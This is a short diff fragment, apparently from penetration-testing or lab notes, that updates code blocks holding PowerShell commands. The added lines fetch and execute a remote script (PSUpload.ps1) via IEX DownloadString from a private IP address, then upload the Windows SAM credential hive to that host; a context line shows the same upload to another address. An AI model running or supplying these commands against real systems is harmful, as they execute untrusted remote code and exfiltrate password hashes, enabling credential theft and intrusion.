@@ -17,11 +17,11 @@ Invoke-FileUpload -Uri "http://10.10.245.147:4446/upload" -File "SAM"
 ```
 
 ```
-
+IEX(New-Object iNet.WebClient).DownloadString('http://10.10.245.153:4445/PSUpload.ps1')
 ```
 
 ```
-
+Invoke-FileUpload -Uri "http://10.10.245.153:4445/upload" -File "SAM"
 ```
 
 ```
